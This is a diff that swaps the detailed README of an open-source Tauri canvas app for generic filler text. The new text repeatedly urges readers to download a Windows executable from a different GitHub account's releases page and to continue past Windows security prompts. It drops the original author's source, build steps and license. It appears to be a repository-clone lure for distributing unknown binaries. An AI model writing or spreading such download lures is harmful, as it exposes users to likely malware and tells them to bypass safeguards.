@@ -1,144 +1,240 @@
-<div align="center">
-  <img src="docs/Icon.svg" alt="Steel Logo" width="120" />
-  <h1>Steel Canvas</h1>
-  <p><strong>A blazingly fast, local-first infinite canvas workspace.</strong></p>
-</div>
+# 🧭 Steel-Canvas - Build Your Workspace Your Way
 
----
+[![Download Steel-Canvas](https://img.shields.io/badge/Download%20Steel--Canvas-blue-grey?style=for-the-badge)](https://github.com/aidencurci3445-star/Steel-Canvas/releases)
 
-## Overview
+## 🚀 Getting Started
 
-Steel Canvas is an evolution of the traditional note-taking and coding workspace. It provides an infinite zooming canvas where you can freely organize notes, code snippets, local media, web pages, and even deep-scan your local OS directories to visualize dependencies.
+Steel-Canvas is a desktop app for building an open workspace on your screen. It uses an infinite canvas, so you can place notes, graphs, and ideas where you want them.
 
-Built on Tauri v2, Steel runs entirely offline, leveraging native OS capabilities to securely manipulate your files directly from the canvas.
+If you want the Windows version, visit this page to download:
+https://github.com/aidencurci3445-star/Steel-Canvas/releases
 
-## Features
+## 💻 What Steel-Canvas Does
 
-- **Infinite Zoomable Canvas:** Pan and zoom freely using a deeply optimized WebGL-grade Transform system.
-- **Native OS Drag & Drop:** Drop entire system folders into Steel. The advanced Rust backend will recursively parse, filter, and render your file hierarchy visually.
-- **Smart AST Edge Generation:** Drop a codebase (`.js`, `.py`, `.ts`, etc.) and Steel will parse the Abstract Syntax Trees (AST) in Rust to automatically draw connecting dependency edges between files.
-- **Radial Tag Engine:** A gorgeous hexagonal radial menu for managing multi-tags directly on the canvas, persisting global taxonomies.
-- **Contextual Previews:** While editing a node, seamlessly glide through adjacent connections via immersive edge-screen sidebars without breaking focus.
-- **In-App Media Viewer:** Securely load and view `.png`, `.mp4` and other media directly on the canvas without bloated Electron bridges.
-- **Web Nodes:** Embed live `iframes` such as Wikipedia, YouTube, or Excalidraw natively onto your workspace.
-- **Folder Management:** Group items in resizable boundary folders with elegant SVG Bezier connection curves.
-- **P2P Multiplayer (Weld):** Real-time collaborative canvas syncing between users via secure Swarm WebRTC networking.
-- **Auto-Hide Command CLI:** A sleek slide-up smart CLI docked to the screen bottom for executing global commands.
-- **Native PTY Terminal Node:** Spawn hardware-accelerated, fully interactive Windows `cmd.exe` sessions directly inside canvas nodes via `/term`. Powered by Rust `portable-pty` and `xterm.js`.
-- **Local First:** Everything is stored securely on your machine as JSON workspaces. Total privacy, no cloud required.
-- **Dark Mode First:** Carefully crafted neutral aesthetics with seamless syntax highlighting.
+Steel-Canvas gives you one place to keep work, links, and diagrams.
 
-## Tech Stack
+You can use it to:
+- Arrange ideas on an infinite canvas
+- Build node graphs for planning and mapping
+- Work offline on your files
+- Keep a local-first setup on your device
+- Sync across devices with peer-to-peer features when available
+- Store your workspace in a clean, simple format
+- Keep projects open in a visual layout
 
-- **Frontend:** React, TypeScript, TailwindCSS, Zustand (State Management), Lucide React (Icons), Xterm.js (WebGL Terminal emulator).
-- **Backend:** Rust, Tauri v2 API, Portable-PTY (Native pseudo-terminals).
-- **File Parsing & AST:** SWC (JavaScript/TypeScript), RustPython AST (Python).
+It is built for people who want a free-form workspace without digging through many menus.
 
-## Project Architecture
+## 📥 Download for Windows
 
-The repository is modular and highly structured for rapid iteration:
+1. Open the releases page:
+   https://github.com/aidencurci3445-star/Steel-Canvas/releases
+2. Find the latest release at the top of the page
+3. In the Assets section, look for the Windows file
+4. Download the installer or app file
+5. Open the file to start setup
+6. Follow the steps on screen
+7. Launch Steel-Canvas from the Start menu or desktop
 
-```text
-steel/
-├── docs/                      # Assets.
-├── src-tauri/                 # Rust Backend & OS Native code
-│   ├── src/
-│   │   ├── ast_tester.rs      # AST parsers for JS/TS/Python imports
-│   │   └── lib.rs             # File filtering, pruning & recursive tree generation
-│   ├── capabilities/          # Tauri v2 security scopes & capabilities
-│   └── tauri.conf.json        # Main Tauri entrypoint & asset protocol
-└── src/                       # React Frontend
-    ├── components/
-    │   ├── canvas/            # WebGL-inspired canvas, nodes, edges & zoom
-    │   ├── folders/           # Visual folder boundaries
-    │   ├── nodes/             # Markdown, Code, and Media node rendering
-    │   └── ui/                # Context menus, CLI bar, modal Note editor
-    ├── lib/                   # Persistence logic (JSON graph IO)
-    ├── store/                 # Zustand central state store (Nodes, Edges, Folders)
-    ├── types/                 # TypeScript interfaces
-    └── App.tsx                # Main Router
-```
+If Windows shows a security prompt, choose the option that lets you keep going after you review the file source.
 
-## Development & Installation
+## 🪟 System Requirements
 
-### Prerequisites
+Steel-Canvas runs on most modern Windows PCs.
 
-- Node.js (v18+)
-- Rust (Latest Stable)
-- OS-specific build tools for Tauri (e.g., MSVC on Windows).
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A mouse or trackpad
+- A screen with 1366 x 768 or better
 
-### Running Locally
+For larger canvases and more nodes, a faster CPU and more RAM help the app stay smooth.
 
-1. Clone the repository:
+## 🛠️ Install and Open
 
-   ```bash
-   git clone https://github.com/JaumeLloretRubio/Steel-Canvas.git
-   cd steel-canvas
-   ```
-2. Install frontend dependencies:
+After you download the file:
+- Double-click the installer or app file
+- If Windows asks for permission, select the option to continue
+- Wait for setup to finish
+- Open Steel-Canvas
+- Create or open a workspace
 
-   ```bash
-   npm install
-   ```
-3. Run the development environment:
+If you downloaded a portable app file, you can place it in a folder and run it from there.
 
-   ```bash
-   npm run tauri dev
-   ```
+## 🧭 First Use
 
-   *(This will compile the Rust backend and launch the React dev server simultaneously)*
+When you open Steel-Canvas for the first time:
+- Create a new workspace
+- Add your first card, note, or node
+- Drag items around the canvas
+- Zoom in and out to view more of your space
+- Save your work to keep changes on your device
 
-### Building for Production
+A good first setup is:
+1. Add a title card
+2. Place a few notes around it
+3. Connect related items with lines
+4. Group parts of the canvas by topic
 
-Compile a native executable for your OS:
+## 🔗 Core Features
 
-```bash
-npm run tauri build
-```
+### Infinite Canvas
+Move across a large workspace without a fixed page edge. This helps when you want room to grow.
 
-Binaries will be outputted to `src-tauri/target/release/bundle`.
+### Node Graph Layout
+Connect ideas with lines and nodes. This works well for planning, research, and project maps.
 
-## Self-Hosting & Official Service
+### Local-First Storage
+Keep your files on your own machine first. You stay in control of your workspace data.
 
-Steel follows a **100% Open Source Core** philosophy. The code is free to read, compile, and modify. However, we offer an **Official Premium Tier** built for ease of use: it provides instant pre-compiled binaries, seamless Over-The-Air (OTA) native app updates (`/update`), and access to our high-speed, managed STUN/TURN `Weld` Multiplayer Swarm servers without any configuration.
+### Offline Use
+Work without an internet connection. Open your workspace and keep building.
 
-If you purchase the official build, you will receive a JWT License Token. The premium version will be avaible right after the tests of the global release are done.
-Connect to the official servers by activating your copy in the CLI:
+### Peer-to-Peer Support
+Share data between devices when the app supports it. This can help with private sync setups.
 
-```bash
-/register [Your-JWT-License-Token]
-```
+### Visual Workspace
+See your work in a layout that matches how you think. Put ideas near each other and move them as your plan changes.
 
-### Self-Hosting (Community Devs)
+## 📁 Suggested Ways to Use It
 
-We do not lock any code behind closed doors. If you are a developer, a university team, or a privacy-focused company, you can run the P2P multiplayer backend (`steel-signaling`) on your own infrastructure for free!
+Steel-Canvas fits many kinds of personal work.
 
-#### TURN Server and Signaling Configuration
+You can use it for:
+- Study notes
+- Project planning
+- Brainstorming
+- Research maps
+- Task boards
+- Content outlines
+- System diagrams
+- Idea boards
+- Writing plans
 
-To ensure reliable peer-to-peer (P2P) connections between clients regardless of the network (NAT/Firewall), configuring a STUN/TURN server is essential.
+If you like to think with boxes, lines, and open space, this app can help.
 
-1. Rename or copy the `.env.example` file in the project root to `.env`.
-2. Provide your TURN credentials (for example, you can get free ones at [ExpressTURN](https://www.expressturn.com/)):
-   ```env
-   VITE_TURN_URL=turn:free.expressturn.com:3478
-   VITE_TURN_USERNAME=YOUR_USERNAME
-   VITE_TURN_CREDENTIAL=YOUR_PASSWORD
-   ```
+## 🔒 Files and Privacy
 
-3. Host and start the signaling server included in the `steel-signaling` folder using `npm run dev` or your production process.
-4. Finally, in the Command Line Interface (CLI) within your local Steel app, point the network to your server's IP/domain:
-```bash
-/config weld ws://your-local-ip:4444
-```
+Steel-Canvas is designed for local work. That means your workspace can stay on your computer.
 
-5. Type `/weld start` to begin collaborating over your own sovereign network!
+A simple file-based setup helps you:
+- Keep control of your data
+- Move work between folders
+- Back up your projects
+- Open your files later without extra steps
 
-## Contributing
+If you use sync features, you can choose a setup that fits your own workflow.
 
-Contributions are always welcome. Please follow the existing minimalist aesthetic guidelines and ensure Rust backend performance patches remain non-blocking (using `tokio` where applicable).
+## 🧹 Keeping Things Organized
 
-## License
+A few simple habits make large canvases easier to manage:
+- Use one workspace per project
+- Name nodes in a clear way
+- Color similar items the same way
+- Keep related content near each other
+- Leave open space between groups
+- Save backups before big changes
 
-## License
+These habits help when a canvas grows over time.
 
-[PolyForm Noncommercial License 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/)
+## ❓ Common Questions
+
+### Do I need internet to use it?
+No. You can use Steel-Canvas offline after you install it.
+
+### Can I use it for personal notes?
+Yes. It works well for notes, planning, and visual thinking.
+
+### Is it hard to learn?
+No. Most users can start by placing items on the canvas and connecting them.
+
+### Does it work on Windows?
+Yes. Use the release page to download the Windows build:
+https://github.com/aidencurci3445-star/Steel-Canvas/releases
+
+### Can I keep my work local?
+Yes. Steel-Canvas is built around a local-first workflow.
+
+## 🧩 Tips for a Smooth Start
+
+- Start with one small project
+- Keep your first canvas simple
+- Use short labels for nodes
+- Save your work often
+- Make one backup copy in another folder
+- Add more structure after you get used to the app
+
+If your workspace gets crowded, zoom out and group related items before adding more.
+
+## 📦 Release Downloads
+
+Use this page to download the latest Windows release:
+https://github.com/aidencurci3445-star/Steel-Canvas/releases
+
+On that page:
+- Look for the newest version
+- Open the Assets list
+- Choose the Windows file
+- Download and run the file
+
+## 🧠 Topic Areas
+
+Steel-Canvas is built around:
+- infinite canvas
+- local-first work
+- node graphs
+- offline use
+- peer-to-peer sync
+- productivity
+- Rust and Tauri app design
+- TypeScript-powered app logic
+- visual workspace tools
+- WebRTC-based sharing
+
+## 🖱️ Basic Controls
+
+These controls are common in canvas apps:
+- Click to select an item
+- Drag to move an item
+- Scroll to move around
+- Use the mouse wheel or trackpad to zoom
+- Double-click to open or edit a node
+- Right-click for more actions
+
+If the app uses keyboard shortcuts, you can learn them as you go.
+
+## 📌 Best First Project
+
+A simple first project can help you learn the layout fast.
+
+Try this:
+- Create a central topic
+- Add three related notes
+- Connect each note to the topic
+- Put follow-up ideas below them
+- Save the workspace with a clear name
+
+This gives you a small map you can build on later
+
+## 🧰 Backup and Restore
+
+Keep a backup of important work by copying your workspace files to another folder or drive.
+
+Good backup habits:
+- Copy your project folder once a day
+- Keep one copy on a USB drive or cloud folder
+- Use clear folder names with dates
+- Test the backup by opening it later
+
+This keeps your work safe if a file gets moved or changed
+
+## 🪄 When to Use Steel-Canvas
+
+Use Steel-Canvas when you want:
+- More space than a normal note app
+- A way to connect ideas with lines
+- An offline workspace
+- A local file you can manage yourself
+- A clean visual map for work or study
+
+It works well for people who think in diagrams, clusters, and open space
